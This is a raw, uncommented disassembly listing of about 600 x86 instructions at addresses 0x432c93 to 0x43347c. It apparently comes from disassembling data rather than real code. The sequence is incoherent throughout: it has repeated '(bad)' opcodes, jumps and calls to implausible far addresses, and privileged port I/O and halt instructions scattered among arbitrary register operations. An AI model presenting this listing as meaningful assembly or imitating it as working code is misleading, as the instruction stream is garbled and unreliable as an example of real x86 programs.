  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
